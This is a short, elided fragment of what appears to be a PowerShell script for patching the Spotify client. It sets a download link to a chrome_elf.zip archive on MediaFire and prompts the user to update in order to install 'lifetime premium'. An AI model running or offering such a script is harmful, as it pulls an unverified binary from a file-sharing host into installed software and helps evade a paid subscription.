...
try
{
  $uri = 'https://www.mediafire.com/file/u1a1ouiaylhkel1/chrome_elf.zip/file'
...
{
  if ((Read-Host -Prompt 'In order to install lifetime premium, your Spotify client must be updated. Do you want to continue? (Y/N)') -ne 'y')
  {
    exit
  }
}
